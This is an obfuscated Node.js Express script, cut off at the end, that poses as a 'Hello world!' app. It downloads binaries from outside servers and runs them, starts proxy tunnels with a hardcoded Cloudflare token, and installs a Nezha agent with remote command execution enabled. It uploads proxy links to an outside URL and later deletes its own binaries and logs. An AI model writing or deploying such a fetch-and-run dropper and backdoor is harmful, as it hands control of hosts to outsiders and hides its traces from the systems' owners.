const _0x838c24=_0x27ba;(function(_0x3b708d,_0x4da9b4){const _0x17e569=_0x27ba,_0x1cd1a9=_0x3b708d();while(!![]){try{const _0x156080=-parseInt(_0x17e569(0x1d6))/0x1+parseInt(_0x17e569(0x195))/0x2*(-parseInt(_0x17e569(0x184))/0x3)+-parseInt(_0x17e569(0x19c))/0x4*(-parseInt(_0x17e569(0x1c7))/0x5)+-parseInt(_0x17e569(0x1fb))/0x6*(-parseInt(_0x17e569(0x18a))/0x7)+parseInt(_0x17e569(0x16e))/0x8*(-parseInt(_0x17e569(0x1ed))/0x9)+parseInt(_0x17e569(0x1dd))/0xa+-parseInt(_0x17e569(0x1db))/0xb*(-parseInt(_0x17e569(0x1d0))/0xc);if(_0x156080===_0x4da9b4)break;else _0x1cd1a9['push'](_0x1cd1a9['shift']());}catch(_0x25bf65){_0x1cd1a9['push'](_0x1cd1a9['shift']());}}}(_0x595f,0xa019c));const express=require(_0x838c24(0x1a8)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x838c24(0x1fe)),{promisify}=require(_0x838c24(0x173)),exec=promisify(require(_0x838c24(0x206))[_0x838c24(0x1b1)]),{execSync}=require(_0x838c24(0x206)),UPLOAD_URL=process[_0x838c24(0x15c)][_0x838c24(0x199)]||'',PROJECT_URL=process[_0x838c24(0x15c)][_0x838c24(0x15a)]||'',AUTO_ACCESS=process['env'][_0x838c24(0x154)]||![],FILE_PATH=process[_0x838c24(0x15c)][_0x838c24(0x155)]||'./tmp',SUB_PATH=process[_0x838c24(0x15c)]['SUB_PATH']||'sub',PORT=process[_0x838c24(0x15c)][_0x838c24(0x1a5)]||process[_0x838c24(0x15c)]['PORT']||0xbb8,UUID=process[_0x838c24(0x15c)][_0x838c24(0x170)]||_0x838c24(0x19f),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x838c24(0x15c)][_0x838c24(0x194)]||'',NEZHA_KEY=process[_0x838c24(0x15c)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x838c24(0x15c)][_0x838c24(0x18d)]||_0x838c24(0x20d),ARGO_AUTH=process[_0x838c24(0x15c)][_0x838c24(0x161)]||_0x838c24(0x209),ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process[_0x838c24(0x15c)][_0x838c24(0x167)]||_0x838c24(0x15d),CFPORT=process[_0x838c24(0x15c)][_0x838c24(0x20f)]||0x1bb,NAME=process[_0x838c24(0x15c)]['NAME']||_0x838c24(0x185);!fs[_0x838c24(0x15f)](FILE_PATH)?(fs[_0x838c24(0x215)](FILE_PATH),console[_0x838c24(0x1d1)](FILE_PATH+'\x20is\x20created')):console[_0x838c24(0x1d1)](FILE_PATH+_0x838c24(0x197));function generateRandomName(){const _0x17da06=_0x838c24,_0x52bab6=_0x17da06(0x216);let _0x206cde='';for(let _0x3ad841=0x0;_0x3ad841<0x6;_0x3ad841++){_0x206cde+=_0x52bab6[_0x17da06(0x17f)](Math[_0x17da06(0x157)](Math['random']()*_0x52bab6[_0x17da06(0x1b4)]));}return _0x206cde;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x838c24(0x201)](FILE_PATH,_0x838c24(0x171)),listPath=path[_0x838c24(0x201)](FILE_PATH,_0x838c24(0x1f7)),bootLogPath=path[_0x838c24(0x201)](FILE_PATH,_0x838c24(0x1f4)),configPath=path[_0x838c24(0x201)](FILE_PATH,_0x838c24(0x218));function deleteNodes(){const _0x402014=_0x838c24;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x4287c7;try{_0x4287c7=fs[_0x402014(0x1e7)](subPath,_0x402014(0x1e1));}catch{return null;}const _0x1ef309=Buffer['from'](_0x4287c7,_0x402014(0x191))[_0x402014(0x1bd)]('utf-8'),_0x34bf0e=_0x1ef309[_0x402014(0x1e9)]('\x0a')['filter'](_0x86fb68=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x402014(0x200)](_0x86fb68));if(_0x34bf0e[_0x402014(0x1b4)]===0x0)return;return axios[_0x402014(0x210)](UPLOAD_URL+_0x402014(0x19e),JSON[_0x402014(0x19a)]({'nodes':_0x34bf0e}),{'headers':{'Content-Type':_0x402014(0x1c2)}})['catch'](_0x3a39c7=>{return null;}),null;}catch(_0x2fb32b){return null;}}function cleanupOldFiles(){const _0x273fe2=_0x838c24;try{const _0x44052a=fs[_0x273fe2(0x1f0)](FILE_PATH);_0x44052a['forEach'](_0x4004b0=>{const _0xc2e556=_0x273fe2,_0x49c0a6=path['join'](FILE_PATH,_0x4004b0);try{const _0x1f40d3=fs[_0xc2e556(0x1a6)](_0x49c0a6);_0x1f40d3['isFile']()&&fs[_0xc2e556(0x187)](_0x49c0a6);}catch(_0x36235d){}});}catch(_0x1a772e){}}app[_0x838c24(0x1ad)]('/',function(_0x3d4025,_0x3b2462){const _0x4491d0=_0x838c24;_0x3b2462[_0x4491d0(0x1d5)](_0x4491d0(0x180));});function _0x595f(){const _0x1bf67a=['base64','https+local://8.8.8.8/dns-query','basename','NEZHA_PORT','6MlGlSJ','npm\x20running\x20error:\x20','\x20already\x20exists','createWriteStream','UPLOAD_URL','stringify','pop','36nJvGUT','chmod','/api/delete-nodes','b85686f6-0f9b-4c54-8727-24f4d169200c','true','push','then','win32','\x0a\x20\x20tunnel:\x20','SERVER_PORT','statSync','&path=%2Fvless-argo%3Fed%3D2560#','express','/tunnel.yml\x20run','\x20>\x20nul\x202>&1','/trojan-argo','https://arm64.ssss.nyc.mn/bot','get','127.0.0.1','vless','\x0a\x20\x20\x20\x20','exec','writeFileSync','/vmess-argo?ed=2560','length','stream','vmess','has','text/plain;\x20charset=utf-8','https://amd64.ssss.nyc.mn/web','--tls','tcp','pkill\x20-f\x20\x22[','toString','Error\x20downloading\x20files:','country_code','trojan','\x20is\x20running','application/json','&path=%2Ftrojan-argo%3Fed%3D2560#','substring','tunnel.yml','clear','51145caAFeW','/config.json\x20>/dev/null\x202>&1\x20&','\x20failed:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x20-p\x20','taskkill\x20/f\x20/im\x20','firefox','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','331668ZlQfPj','log','del\x20/f\x20/q\x20','finish','/sub.txt\x20saved\x20successfully','send','447719xIEnPn','Download\x20','false','quic','fileName','319FbVUCV','.exe\x20>\x20nul\x202>&1','4267050JdUBBf','nohup\x20','Skipping\x20adding\x20automatic\x20access\x20task','&fp=firefox&type=ws&host=','utf-8','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Add\x20automatic\x20access\x20task\x20faild:\x20','data','2053','ArgoDomain:','readFileSync','Unhandled\x20error\x20in\x20startserver:','split','map','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/dev/null','1953epmofC','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','message','readdirSync','fileUrl','https://amd64.ssss.nyc.mn/agent','https://oooo.serv00.net/add-url','boot.log','countryCode','from','list.txt','blackhole','\x20successfully','listen','12oMsvei','?security=tls&sni=','Nodes\x20uploaded\x20successfully','path','\x0a\x0atrojan://','test','join','443','\x22\x20>\x20/dev/null\x202>&1','/vmess-argo','http','child_process','Error\x20reading\x20boot.log:','8443','eyJhIjoiZjMwZTAzNWMyMDgwMTE3MjA2ZTkzY2I4YWJiNmI5OWIiLCJ0IjoiNWExZTVlYTYtNDRkYS00NDJjLThhMzMtNTg2ZDQ3ODBjNzllIiwicyI6Ik5EWTNZMkpoWXpVdFptTTFaaTAwWVdabUxUaGpZelF0TmpJeE5UWmlZbU5oWkRVMyJ9','response','Content-Type','freedom','railway.cwdd.de5.net','direct','CFPORT','post','org','\x20-c\x20\x22','php\x20running\x20error:\x20','status','mkdirSync','abcdefghijklmnopqrstuvwxyz','close','config.json','AUTO_ACCESS','FILE_PATH','2096','floor','none','Empowerment\x20success\x20for\x20','PROJECT_URL','\x0aclient_secret:\x20','env','cdns.doon.eu.org','2087','existsSync','2083','ARGO_AUTH','https://amd64.ssss.nyc.mn/v1','Error\x20executing\x20command:\x20','/api/add-nodes','https://ipapi.co/json/','xtls-rprx-vision','CFIP','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','/vless-argo','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','http\x20server\x20is\x20running\x20on\x20port:','unshift','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','41736ptpHIp','\x20-c\x20','UUID','sub.txt','tunnel.json','util','Unknown','\x20>/dev/null\x202>&1\x20&','NEZHA\x20variable\x20is\x20empty,skip\x20running','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','unlink','includes','Subscription\x20uploaded\x20successfully','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','catch','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','forEach','charAt','Hello\x20world!','match','tls','error','202983HJazJZ','Railway','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','unlinkSync','TunnelSecret','https://arm64.ssss.nyc.mn/agent','3913931frVLLY','Empowerment\x20failed\x20for\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','ARGO_DOMAIN','Error\x20in\x20startserver:','arm','amd'];_0x595f=function(){return _0x1bf67a;};return _0x595f();}async function generateConfig(){const _0x2aa84a=_0x838c24,_0x235cda={'log':{'access':_0x2aa84a(0x1ec),'error':_0x2aa84a(0x1ec),'loglevel':_0x2aa84a(0x158)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2aa84a(0x1af),'settings':{'clients':[{'id':UUID,'flow':_0x2aa84a(0x166)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x2aa84a(0x169),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x2aa84a(0x1ab),'dest':0xbbc}]},'streamSettings':{'network':_0x2aa84a(0x1bb)}},{'port':0xbb9,'listen':_0x2aa84a(0x1ae),'protocol':_0x2aa84a(0x1af),'settings':{'clients':[{'id':UUID}],'decryption':_0x2aa84a(0x158)},'streamSettings':{'network':_0x2aa84a(0x1bb),'security':_0x2aa84a(0x158)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x2aa84a(0x1af),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2aa84a(0x158)},'streamSettings':{'network':'ws','security':_0x2aa84a(0x158),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x2aa84a(0x205),_0x2aa84a(0x182),_0x2aa84a(0x1d9)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2aa84a(0x1ae),'protocol':_0x2aa84a(0x1b6),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2aa84a(0x204)}},'sniffing':{'enabled':!![],'destOverride':[_0x2aa84a(0x205),'tls',_0x2aa84a(0x1d9)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2aa84a(0x1ae),'protocol':_0x2aa84a(0x1c0),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2aa84a(0x158),'wsSettings':{'path':_0x2aa84a(0x1ab)}},'sniffing':{'enabled':!![],'destOverride':[_0x2aa84a(0x205),'tls',_0x2aa84a(0x1d9)],'metadataOnly':![]}}],'dns':{'servers':[_0x2aa84a(0x192)]},'outbounds':[{'protocol':_0x2aa84a(0x20c),'tag':_0x2aa84a(0x20e)},{'protocol':_0x2aa84a(0x1f8),'tag':'block'}]};fs[_0x2aa84a(0x1b2)](path['join'](FILE_PATH,_0x2aa84a(0x218)),JSON[_0x2aa84a(0x19a)](_0x235cda,null,0x2));}function getSystemArchitecture(){const _0x237567=_0x838c24,_0x1627c8=os['arch']();return _0x1627c8===_0x237567(0x18f)||_0x1627c8==='arm64'||_0x1627c8==='aarch64'?_0x237567(0x18f):_0x237567(0x190);}function downloadFile(_0x2bd0c,_0x4651d7,_0x9e3cfe){const _0xad107c=_0x838c24,_0x152255=_0x2bd0c;!fs[_0xad107c(0x15f)](FILE_PATH)&&fs[_0xad107c(0x215)](FILE_PATH,{'recursive':!![]});const _0x28f2a4=fs[_0xad107c(0x198)](_0x152255);axios({'method':_0xad107c(0x1ad),'url':_0x4651d7,'responseType':_0xad107c(0x1b5)})[_0xad107c(0x1a2)](_0x1066a5=>{const _0x584b0b=_0xad107c;_0x1066a5[_0x584b0b(0x1e4)]['pipe'](_0x28f2a4),_0x28f2a4['on'](_0x584b0b(0x1d3),()=>{const _0xc4c7fe=_0x584b0b;_0x28f2a4[_0xc4c7fe(0x217)](),console[_0xc4c7fe(0x1d1)](_0xc4c7fe(0x1d7)+path[_0xc4c7fe(0x193)](_0x152255)+_0xc4c7fe(0x1f9)),_0x9e3cfe(null,_0x152255);}),_0x28f2a4['on'](_0x584b0b(0x183),_0x52619f=>{const _0x22eebd=_0x584b0b;fs[_0x22eebd(0x178)](_0x152255,()=>{});const _0x4862d8=_0x22eebd(0x1d7)+path[_0x22eebd(0x193)](_0x152255)+_0x22eebd(0x1c9)+_0x52619f[_0x22eebd(0x1ef)];console[_0x22eebd(0x183)](_0x4862d8),_0x9e3cfe(_0x4862d8);});})[_0xad107c(0x17c)](_0x4c812f=>{const _0x274fc6=_0xad107c,_0x187534=_0x274fc6(0x1d7)+path[_0x274fc6(0x193)](_0x152255)+_0x274fc6(0x1c9)+_0x4c812f[_0x274fc6(0x1ef)];console['error'](_0x187534),_0x9e3cfe(_0x187534);});}async function downloadFilesAndRun(){const _0x3ef5ed=_0x838c24,_0x5bd02f=getSystemArchitecture(),_0x2be636=getFilesForArchitecture(_0x5bd02f);if(_0x2be636[_0x3ef5ed(0x1b4)]===0x0){console[_0x3ef5ed(0x1d1)](_0x3ef5ed(0x1cb));return;}const _0x1e1aed=_0x2be636[_0x3ef5ed(0x1ea)](_0x18a623=>{return new Promise((_0x5f5c3f,_0x347d96)=>{const _0x3551c2=_0x27ba;downloadFile(_0x18a623[_0x3551c2(0x1da)],_0x18a623[_0x3551c2(0x1f1)],(_0x24b56f,_0x10dc4c)=>{_0x24b56f?_0x347d96(_0x24b56f):_0x5f5c3f(_0x10dc4c);});});});try{await Promise['all'](_0x1e1aed);}catch(_0x276240){console[_0x3ef5ed(0x183)](_0x3ef5ed(0x1be),_0x276240);return;}function _0x6535f1(_0x77eaac){const _0x4de9b5=_0x3ef5ed,_0x47feff=0x1fd;_0x77eaac[_0x4de9b5(0x17e)](_0x20c57c=>{const _0x199dd8=_0x4de9b5;fs[_0x199dd8(0x15f)](_0x20c57c)&&fs[_0x199dd8(0x19d)](_0x20c57c,_0x47feff,_0x2d7faa=>{const _0x475a57=_0x199dd8;_0x2d7faa?console[_0x475a57(0x183)](_0x475a57(0x18b)+_0x20c57c+':\x20'+_0x2d7faa):console['log'](_0x475a57(0x159)+_0x20c57c+':\x20'+_0x47feff[_0x475a57(0x1bd)](0x8));});});}const _0xf7e5b2=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x6535f1(_0xf7e5b2);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xe0d620=NEZHA_SERVER[_0x3ef5ed(0x179)](':')?NEZHA_SERVER[_0x3ef5ed(0x1e9)](':')[_0x3ef5ed(0x19b)]():'',_0x12218d=new Set([_0x3ef5ed(0x202),_0x3ef5ed(0x208),_0x3ef5ed(0x156),'2087',_0x3ef5ed(0x160),_0x3ef5ed(0x1e5)]),_0x5d75c7=_0x12218d[_0x3ef5ed(0x1b7)](_0xe0d620)?_0x3ef5ed(0x1a0):_0x3ef5ed(0x1d8),_0x26d5d8=_0x3ef5ed(0x15b)+NEZHA_KEY+_0x3ef5ed(0x1ca)+NEZHA_SERVER+_0x3ef5ed(0x1ee)+_0x5d75c7+_0x3ef5ed(0x18c)+UUID;fs[_0x3ef5ed(0x1b2)](path[_0x3ef5ed(0x201)](FILE_PATH,'config.yaml'),_0x26d5d8);const _0x3aee45=_0x3ef5ed(0x1de)+phpPath+_0x3ef5ed(0x212)+FILE_PATH+_0x3ef5ed(0x1cf);try{await exec(_0x3aee45),console['log'](phpName+_0x3ef5ed(0x1c1)),await new Promise(_0x2fe4be=>setTimeout(_0x2fe4be,0x3e8));}catch(_0x1fe79e){console[_0x3ef5ed(0x183)](_0x3ef5ed(0x213)+_0x1fe79e);}}else{let _0x2dc7d7='';const _0x259ef5=[_0x3ef5ed(0x202),_0x3ef5ed(0x208),_0x3ef5ed(0x156),_0x3ef5ed(0x15e),'2083',_0x3ef5ed(0x1e5)];_0x259ef5[_0x3ef5ed(0x179)](NEZHA_PORT)&&(_0x2dc7d7=_0x3ef5ed(0x1ba));const _0x1ff49b=_0x3ef5ed(0x1de)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x3ef5ed(0x1cc)+NEZHA_KEY+'\x20'+_0x2dc7d7+_0x3ef5ed(0x1e2);try{await exec(_0x1ff49b),console[_0x3ef5ed(0x1d1)](npmName+_0x3ef5ed(0x1c1)),await new Promise(_0x4c501b=>setTimeout(_0x4c501b,0x3e8));}catch(_0x17fde3){console['error'](_0x3ef5ed(0x196)+_0x17fde3);}}}else console[_0x3ef5ed(0x1d1)](_0x3ef5ed(0x176));const _0x35f721=_0x3ef5ed(0x1de)+webPath+_0x3ef5ed(0x16f)+FILE_PATH+_0x3ef5ed(0x1c8);try{await exec(_0x35f721),console[_0x3ef5ed(0x1d1)](webName+_0x3ef5ed(0x1c1)),await new Promise(_0x4a9c3e=>setTimeout(_0x4a9c3e,0x3e8));}catch(_0x4874e7){console['error']('web\x20running\x20error:\x20'+_0x4874e7);}if(fs[_0x3ef5ed(0x15f)](botPath)){let _0x1c685c;if(ARGO_AUTH[_0x3ef5ed(0x181)](/^[A-Z0-9a-z=]{120,250}$/))_0x1c685c=_0x3ef5ed(0x168)+ARGO_AUTH;else ARGO_AUTH[_0x3ef5ed(0x181)](/TunnelSecret/)?_0x1c685c=_0x3ef5ed(0x186)+FILE_PATH+_0x3ef5ed(0x1a9):_0x1c685c=_0x3ef5ed(0x16a)+FILE_PATH+_0x3ef5ed(0x1eb)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x1c685c+'\x20>/dev/null\x202>&1\x20&'),console[_0x3ef5ed(0x1d1)](botName+'\x20is\x20running'),await new Promise(_0x16e4fc=>setTimeout(_0x16e4fc,0x7d0));}catch(_0x3c5e92){console['error'](_0x3ef5ed(0x163)+_0x3c5e92);}}await new Promise(_0x2049b1=>setTimeout(_0x2049b1,0x1388));}function getFilesForArchitecture(_0x53c113){const _0x1b3188=_0x838c24;let _0x4bee6b;_0x53c113===_0x1b3188(0x18f)?_0x4bee6b=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x1b3188(0x1ac)}]:_0x4bee6b=[{'fileName':webPath,'fileUrl':_0x1b3188(0x1b9)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x81f5f9=_0x53c113===_0x1b3188(0x18f)?_0x1b3188(0x189):_0x1b3188(0x1f2);_0x4bee6b[_0x1b3188(0x16c)]({'fileName':npmPath,'fileUrl':_0x81f5f9});}else{const _0xa97fe0=_0x53c113===_0x1b3188(0x18f)?'https://arm64.ssss.nyc.mn/v1':_0x1b3188(0x162);_0x4bee6b[_0x1b3188(0x16c)]({'fileName':phpPath,'fileUrl':_0xa97fe0});}}return _0x4bee6b;}function argoType(){const _0x164692=_0x838c24;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x164692(0x1d1)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH['includes'](_0x164692(0x188))){fs[_0x164692(0x1b2)](path[_0x164692(0x201)](FILE_PATH,_0x164692(0x172)),ARGO_AUTH);const _0x4721f9=_0x164692(0x1a4)+ARGO_AUTH[_0x164692(0x1e9)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x164692(0x201)](FILE_PATH,'tunnel.json')+_0x164692(0x16d)+ARGO_DOMAIN+_0x164692(0x17b)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x164692(0x1b2)](path[_0x164692(0x201)](FILE_PATH,_0x164692(0x1c5)),_0x4721f9);}else console['log'](_0x164692(0x17d));}async function extractDomains(){const _0x260d0e=_0x838c24;let _0x44ddad;if(ARGO_AUTH&&ARGO_DOMAIN)_0x44ddad=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x44ddad),await _0x36d7af(_0x44ddad);else try{const _0x27e072=fs[_0x260d0e(0x1e7)](path['join'](FILE_PATH,_0x260d0e(0x1f4)),_0x260d0e(0x1e1)),_0x15c3fd=_0x27e072[_0x260d0e(0x1e9)]('\x0a'),_0x201d6d=[];_0x15c3fd['forEach'](_0xc28c8d=>{const _0x4dda61=_0xc28c8d['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4dda61){const _0x9bd8e3=_0x4dda61[0x1];_0x201d6d['push'](_0x9bd8e3);}});if(_0x201d6d[_0x260d0e(0x1b4)]>0x0)_0x44ddad=_0x201d6d[0x0],console['log'](_0x260d0e(0x1e6),_0x44ddad),await _0x36d7af(_0x44ddad);else{console['log'](_0x260d0e(0x177)),fs[_0x260d0e(0x187)](path[_0x260d0e(0x201)](FILE_PATH,_0x260d0e(0x1f4)));async function _0x2ed980(){const _0x10ccfd=_0x260d0e;try{process['platform']===_0x10ccfd(0x1a3)?await exec(_0x10ccfd(0x1cd)+botName+_0x10ccfd(0x1dc)):await exec(_0x10ccfd(0x1bc)+botName[_0x10ccfd(0x17f)](0x0)+']'+botName[_0x10ccfd(0x1c4)](0x1)+_0x10ccfd(0x203));}catch(_0x451338){}}_0x2ed980(),await new Promise(_0x567275=>setTimeout(_0x567275,0xbb8));const _0x2e40bf=_0x260d0e(0x16a)+FILE_PATH+_0x260d0e(0x1eb)+ARGO_PORT;try{await exec(_0x260d0e(0x1de)+botPath+'\x20'+_0x2e40bf+_0x260d0e(0x175)),console[_0x260d0e(0x1d1)](botName+'\x20is\x20running'),await new Promise(_0x421b5b=>setTimeout(_0x421b5b,0xbb8)),await extractDomains();}catch(_0x16f198){console[_0x260d0e(0x183)]('Error\x20executing\x20command:\x20'+_0x16f198);}}}catch(_0x5078b5){console['error'](_0x260d0e(0x207),_0x5078b5);}async function _0xb13385(){const _0x4b25e7=_0x260d0e;try{const _0x417c35=await axios[_0x4b25e7(0x1ad)](_0x4b25e7(0x165),{'timeout':0xbb8});if(_0x417c35[_0x4b25e7(0x1e4)]&&_0x417c35[_0x4b25e7(0x1e4)][_0x4b25e7(0x1bf)]&&_0x417c35[_0x4b25e7(0x1e4)]['org'])return _0x417c35['data'][_0x4b25e7(0x1bf)]+'_'+_0x417c35[_0x4b25e7(0x1e4)][_0x4b25e7(0x211)];}catch(_0x3c9a79){try{const _0x3f9eba=await axios[_0x4b25e7(0x1ad)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x3f9eba[_0x4b25e7(0x1e4)]&&_0x3f9eba[_0x4b25e7(0x1e4)][_0x4b25e7(0x214)]==='success'&&_0x3f9eba[_0x4b25e7(0x1e4)][_0x4b25e7(0x1f5)]&&_0x3f9eba[_0x4b25e7(0x1e4)]['org'])return _0x3f9eba['data'][_0x4b25e7(0x1f5)]+'_'+_0x3f9eba[_0x4b25e7(0x1e4)][_0x4b25e7(0x211)];}catch(_0x5cab64){}}return _0x4b25e7(0x174);}async function _0x36d7af(_0x2dce34){const _0x316477=await _0xb13385(),_0x7e9d1b=NAME?NAME+'-'+_0x316477:_0x316477;return new Promise(_0x511800=>{setTimeout(()=>{const _0x1faa38=_0x27ba,_0xa026c0={'v':'2','ps':''+_0x7e9d1b,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1faa38(0x158),'net':'ws','type':_0x1faa38(0x158),'host':_0x2dce34,'path':_0x1faa38(0x1b3),'tls':_0x1faa38(0x182),'sni':_0x2dce34,'alpn':'','fp':_0x1faa38(0x1ce)},_0x1743b8='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x2dce34+_0x1faa38(0x1e0)+_0x2dce34+_0x1faa38(0x1a7)+_0x7e9d1b+'\x0a\x0avmess://'+Buffer[_0x1faa38(0x1f6)](JSON['stringify'](_0xa026c0))[_0x1faa38(0x1bd)]('base64')+_0x1faa38(0x1ff)+UUID+'@'+CFIP+':'+CFPORT+_0x1faa38(0x1fc)+_0x2dce34+_0x1faa38(0x1e0)+_0x2dce34+_0x1faa38(0x1c3)+_0x7e9d1b+_0x1faa38(0x1b0);console[_0x1faa38(0x1d1)](Buffer['from'](_0x1743b8)[_0x1faa38(0x1bd)](_0x1faa38(0x191))),fs[_0x1faa38(0x1b2)](subPath,Buffer['from'](_0x1743b8)[_0x1faa38(0x1bd)](_0x1faa38(0x191))),console[_0x1faa38(0x1d1)](FILE_PATH+_0x1faa38(0x1d4)),uploadNodes(),app[_0x1faa38(0x1ad)]('/'+SUB_PATH,(_0x4634b8,_0x4217dd)=>{const _0x5df827=_0x1faa38,_0x115308=Buffer['from'](_0x1743b8)[_0x5df827(0x1bd)](_0x5df827(0x191));_0x4217dd['set'](_0x5df827(0x20b),_0x5df827(0x1b8)),_0x4217dd['send'](_0x115308);}),_0x511800(_0x1743b8);},0x7d0);});}}async function uploadNodes(){const _0x5b90be=_0x838c24;if(UPLOAD_URL&&PROJECT_URL){const _0x3637fb=PROJECT_URL+'/'+SUB_PATH,_0x375a10={'subscription':[_0x3637fb]};try{const _0x8fb693=await axios[_0x5b90be(0x210)](UPLOAD_URL+'/api/add-subscriptions',_0x375a10,{'headers':{'Content-Type':_0x5b90be(0x1c2)}});return _0x8fb693&&_0x8fb693[_0x5b90be(0x214)]===0xc8?(console[_0x5b90be(0x1d1)](_0x5b90be(0x17a)),_0x8fb693):null;}catch(_0xfd4778){if(_0xfd4778[_0x5b90be(0x20a)]){if(_0xfd4778[_0x5b90be(0x20a)][_0x5b90be(0x214)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5b90be(0x15f)](listPath))return;const _0x2d592d=fs[_0x5b90be(0x1e7)](listPath,_0x5b90be(0x1e1)),_0x4c59a8=_0x2d592d[_0x5b90be(0x1e9)]('\x0a')['filter'](_0x26bb38=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5b90be(0x200)](_0x26bb38));if(_0x4c59a8[_0x5b90be(0x1b4)]===0x0)return;const _0x165656=JSON[_0x5b90be(0x19a)]({'nodes':_0x4c59a8});try{const _0x49a3ba=await axios[_0x5b90be(0x210)](UPLOAD_URL+_0x5b90be(0x164),_0x165656,{'headers':{'Content-Type':_0x5b90be(0x1c2)}});return _0x49a3ba&&_0x49a3ba['status']===0xc8?(console['log'](_0x5b90be(0x1fd)),_0x49a3ba):null;}catch(_0x18fcf0){return null;}}else return;}}function _0x27ba(_0x4dfb1f,_0x27c2ac){_0x4dfb1f=_0x4dfb1f-0x154;const _0x595f0e=_0x595f();let _0x27ba6a=_0x595f0e[_0x4dfb1f];return _0x27ba6a;}function cleanFiles(){setTimeout(()=>{const _0x5366e5=_0x27ba,_0x39fc3c=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x39fc3c[_0x5366e5(0x1a1)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x39fc3c[_0x5366e5(0x1a1)](phpPath);process['platform']===_0x5366e5(0x1a3)?exec(_0x5366e5(0x1d2)+_0x39fc3c['join']('\x20')+_0x5366e5(0x1aa),_0x57de5b=>{const _0xb2e3fe=_0x5366e5;console[_0xb2e3fe(0x1c6)](),console['log']('App\x20is\x20running'),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x39fc3c[_0x5366e5(0x201)]('\x20')+'\x20>/dev/null\x202>&1',_0x39b576=>{const _0x151091=_0x5366e5;console[_0x151091(0x1c6)](),console['log']('App\x20is\x20running'),console[_0x151091(0x1d1)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x54d69c=_0x838c24;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x54d69c(0x1df));return;}try{const _0x452fdc=await axios['post'](_0x54d69c(0x1f3),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x54d69c(0x1c2)}});return 